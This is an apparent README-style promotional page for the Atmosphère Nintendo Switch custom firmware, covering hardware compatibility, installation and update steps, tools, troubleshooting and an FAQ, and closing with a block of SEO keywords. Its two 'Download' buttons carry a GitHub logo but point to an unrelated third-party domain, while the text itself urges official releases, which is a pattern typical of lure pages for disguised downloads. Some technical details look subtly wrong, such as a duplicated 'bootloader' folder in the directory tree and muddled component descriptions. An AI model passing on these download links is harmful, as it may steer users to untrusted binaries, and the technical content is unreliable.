
# Nintendo Switch Atmosphere CFW

<p align="center">
  <img src="https://img.shields.io/badge/Nintendo-Switch-red?style=for-the-badge&logo=nintendo-switch" alt="Nintendo Switch"/>
  <img src="https://img.shields.io/badge/CFW-Atmosphere-blue?style=for-the-badge" alt="Atmosphere CFW"/>
  <img src="https://img.shields.io/badge/Bootloader-Hekate-purple?style=for-the-badge" alt="Hekate"/>
  <img src="https://img.shields.io/badge/Homebrew-Supported-green?style=for-the-badge" alt="Homebrew"/>
</p>

<p align="center">
  An open-source custom firmware and homebrew resource collection for compatible Nintendo Switch consoles.
</p>

<p align="center">
  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-Atmosphere%20CFW-blue?style=for-the-badge&logo=github" alt="Download Atmosphere CFW"/></a>
</p>

## Overview

Atmosphère is an open-source custom firmware (CFW) for the original Nintendo Switch family. It modifies and extends the Horizon operating system to provide homebrew support, custom system modules, filesystem modifications, and additional system functionality.

This repository covers Atmosphère, Hekate, emuMMC, Homebrew Launcher, sysmodules, overlays, themes, and console management tools.

Atmosphère is designed for the original Nintendo Switch hardware. It is not compatible with Nintendo Switch 2.

The project is intended for homebrew development, system customization, backups, emulation, and legitimate console maintenance.

## Key Features

- Atmosphère custom firmware environment.
- Hekate bootloader integration.
- Homebrew Launcher support.
- emuMMC and NAND redirection.
- Custom system modules (sysmodules).
- Layered filesystem modifications.
- Custom themes and interface modifications.
- Overlay and system monitoring support.
- Homebrew application management.
- NAND backup and restoration workflows.
- Configuration and payload management.
- System diagnostics and troubleshooting.

## Technical Specifications

| Component | Description |
|---|---|
| Platform | Original Nintendo Switch family |
| Operating system | Horizon OS |
| Architecture | ARM64 |
| Custom firmware | Atmosphère |
| Bootloader | Hekate |
| Main payload | `fusee.bin` |
| Homebrew environment | Homebrew Launcher |
| Menu | Homebrew Menu (`hbmenu`) |
| Virtual NAND | emuMMC |
| System modules | Atmosphère sysmodules |
| Configuration | INI and system configuration files |
| Storage | microSD |
| Firmware compatibility | Version-specific |

### Current Release Reference

| Component | Version |
|---|---|
| Atmosphère | 1.12.2 |
| Hekate | 6.5.5 |
| Nintendo Switch firmware | 23.5.0 |

Atmosphère 1.12.2 and Hekate 6.5.5 provide support for Nintendo Switch firmware 23.5.0. Always check the official release notes before updating.

## Compatibility

Atmosphère supports compatible original Nintendo Switch hardware configurations. The installation method depends primarily on the hardware revision.

| Console model | Hardware | CFW installation method |
|---|---|---|
| Original Switch V1 (unpatched) | Erista | RCM exploit, no internal modchip required |
| Original Switch V1 (patched) | Erista | Modchip or other specifically supported method |
| Switch V2 | Mariko | Modchip required |
| Switch Lite | Mariko | Modchip required |
| Switch OLED | Mariko | Modchip required |
| Nintendo Switch 2 | Different hardware platform | Not supported by Atmosphère |

### Important Hardware Notes

- Only certain early original Switch V1 units support the unpatched RCM exploit.
- Later V1 units may have patched hardware and cannot use the same software-only entry point.
- V2, Lite, and OLED models require compatible hardware modification for the standard Atmosphère CFW route.
- Modchip installation requires board-level soldering and carries a risk of hardware damage.
- A serial-number compatibility check is useful, but uncertain V1 units should be verified using the appropriate hardware test.

Firmware compatibility and hardware compatibility are separate requirements. A supported firmware version does not make a patched console exploitable through an unpatched RCM method.

## Firmware Features

### Atmosphère

Atmosphère is the main custom firmware environment.

Its components include:

| Component | Function |
|---|---|
| Fusée | First-stage loader |
| Exosphère | Customized secure monitor |
| Thermosphère | emuMMC and NAND redirection |
| Stratosphère | Custom system modules |
| Troposphère | Application-level system patches |
| `dmnt` | Cheat and debugging functionality |

### Hekate

Hekate is a bootloader and maintenance utility used in many Switch CFW configurations.

Features include:

- Payload launching.
- Atmosphère boot configuration.
- emuMMC management.
- NAND backup and restoration.
- Partition and storage utilities.
- System information and diagnostics.

### emuMMC

emuMMC provides an emulated or redirected NAND environment.

Benefits include:

- Separation of system environments.
- Testing homebrew and system modifications.
- Keeping a separate stock system configuration.
- Easier recovery planning when used with proper backups.

emuMMC does not guarantee protection from console bans or eliminate all risks associated with online services.

## System Requirements

### Hardware

- Compatible original Nintendo Switch console.
- microSD card with sufficient storage.
- USB-C cable for computer-assisted procedures.
- Compatible RCM jig for unpatched V1 consoles.
- Compatible modchip for patched hardware where required.
- Computer for payload injection and SD card preparation.

### Software

- Atmosphère release package.
- Matching Hekate release.
- Correct `fusee.bin` payload.
- Compatible Homebrew Menu files.
- microSD formatting and partition tools.
- Official installation documentation.
- NAND backup storage.

### Preparation

Before installation:

1. Identify the exact Switch hardware revision.
2. Check whether the console is RCM exploitable or requires a modchip.
3. Check the installed system firmware.
4. Verify Atmosphère and Hekate compatibility.
5. Back up the original NAND before making system changes.
6. Prepare the microSD card according to the chosen installation guide.

## Download & Installation

<p align="center">
  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-Nintendo%20Switch%20CFW-blue?style=for-the-badge&logo=github" alt="Download Nintendo Switch CFW"/></a>
</p>

### Atmosphère Installation Overview

1. Verify the console's hardware compatibility.
2. Read the current NH Switch Guide for the correct installation path.
3. Download the official Atmosphère release.
4. Download the matching Hekate release if using Hekate.
5. Prepare the microSD card using the recommended layout.
6. Copy the required Atmosphère files to the microSD card.
7. Place the correct payload files in the appropriate locations.
8. Configure the bootloader according to the official instructions.
9. Enter the required boot mode for the console hardware.
10. Launch Atmosphère and verify the CFW version.

### Updating Atmosphère

1. Check whether the new Atmosphère release supports the target system firmware.
2. Check Hekate compatibility if it is part of the setup.
3. Back up the microSD contents and important NAND data.
4. Read the release notes for both projects.
5. Replace the required files with the matching release versions.
6. Update the payload and bootloader configuration where necessary.
7. Verify that homebrew applications and sysmodules remain compatible.

Do not update the console firmware before confirming that the required CFW components support it.

## Configuration & Management

### Main Files and Directories

Typical microSD structure:

```text
SD Card/
├── atmosphere/
│   ├── config/
│   ├── contents/
│   ├── kip_patches/
│   └── package3
├── bootloader/
│   ├── hekate_ipl.ini
│   ├── payloads/
│   └── sys/
├── switch/
│   └── homebrew.nro
└── bootloader/
    └── payload.bin
```

The exact directory contents depend on the release and selected boot configuration.

### Recommended Tools

| Tool | Purpose |
|---|---|
| Atmosphère | Custom firmware |
| Hekate | Bootloader and system maintenance |
| Homebrew Menu | Homebrew application launcher |
| DBI | Application and system content management |
| NX-Shell | File management |
| JKSV | Save data backup and management |
| Checkpoint | Save management for compatible setups |
| Tesla Menu | Overlay management |
| sys-clk | Clock and performance management |
| ftpd | File transfer over network |

Use tools only from trusted project sources and verify compatibility with the installed Atmosphère release.

### System Management

Recommended practices:

- Maintain separate stock and CFW environments where appropriate.
- Keep a verified NAND backup.
- Use a dedicated folder for payload backups.
- Avoid unnecessary system module installations.
- Remove incompatible overlays and sysmodules before troubleshooting.
- Keep the bootloader and custom firmware versions aligned.

## Troubleshooting

| Problem | Possible cause | Recommended action |
|---|---|---|
| Atmosphère does not boot | Incorrect or outdated payload | Verify the matching `fusee.bin` |
| Hekate does not start | Incorrect boot files or SD configuration | Check the bootloader files |
| Black screen after update | Firmware and CFW mismatch | Verify release compatibility |
| Homebrew Menu crashes | Incompatible application or applet memory limits | Test a compatible homebrew application |
| Missing sysmodules | Incorrect folder structure or incompatible module | Review module installation |
| emuMMC does not appear | Incorrect partition or configuration | Check emuMMC settings in Hekate |
| SD card errors | Filesystem corruption or card failure | Back up data and test the card |
| Console enters RCM but payload fails | Patched hardware or incorrect payload | Verify hardware revision and payload |
| System freezes | Conflicting sysmodule or modification | Disable recently added modules |
| Online services unavailable | Network configuration or console restriction | Check system status and avoid unauthorized modifications |

## FAQ

### 1. What is Atmosphère?

Atmosphère is an open-source custom firmware for the original Nintendo Switch. It adds homebrew support and system customization capabilities.

### 2. Is Atmosphère a jailbreak?

It is more accurately described as custom firmware (CFW). It modifies the Switch operating system and requires a compatible hardware entry point.

### 3. Does Atmosphère work on every Nintendo Switch?

Atmosphère supports the original Switch family, but installation requirements differ by hardware revision. Switch 2 is not supported.

### 4. Can I install Atmosphère without a modchip?

Some early unpatched original Switch V1 consoles support the RCM exploit and do not require a modchip. Patched V1, V2, Lite, and OLED hardware generally require a compatible modchip.

### 5. What is Hekate?

Hekate is a bootloader and maintenance environment used to launch custom firmware, manage emuMMC, and perform NAND backup operations.

### 6. What is emuMMC?

emuMMC is an emulated NAND environment that allows a separate system environment to be used from the microSD card.

### 7. What is the difference between Atmosphère and Hekate?

Atmosphère is the custom firmware. Hekate is a bootloader and maintenance tool that can launch Atmosphère.

### 8. Can Atmosphère run homebrew applications?

Yes. It supports the Homebrew Launcher and compatible homebrew applications.

### 9. Can I use Atmosphère online?

Using CFW online can carry a risk of console restrictions or bans. Separating environments does not guarantee safety.

### 10. Can I update Nintendo Switch firmware?

Yes, but only after checking that the installed Atmosphère and Hekate versions support the target firmware.

### 11. Can I restore the original system?

A stock system can often be restored or booted depending on the hardware and configuration. A verified NAND backup is strongly recommended before making modifications.

### 12. Does Atmosphère support Nintendo Switch 2?

No. Atmosphère is designed for the original Nintendo Switch hardware family.

## SEO Keywords

Nintendo Switch Jailbreak, Nintendo Switch CFW, Atmosphère CFW, Atmosphere Nintendo Switch, Hekate Bootloader, Switch Homebrew, Nintendo Switch Homebrew, Switch Custom Firmware, Switch Modding, Switch emuMMC, Switch EmuNAND, Switch NAND Backup, Switch Payload, Fusee Payload, Homebrew Launcher, Homebrew Menu, Switch Sysmodules, Switch Overlays, Tesla Menu, DBI Switch, NX-Shell, JKSV, Checkpoint Switch, sys-clk, Nintendo Switch V1, Nintendo Switch V2, Switch Lite CFW, Switch OLED CFW, RCM Exploit, Switch Modchip, Horizon OS, Nintendo Switch Firmware, Atmosphere Installation, Atmosphere Update, Switch CFW Troubleshooting
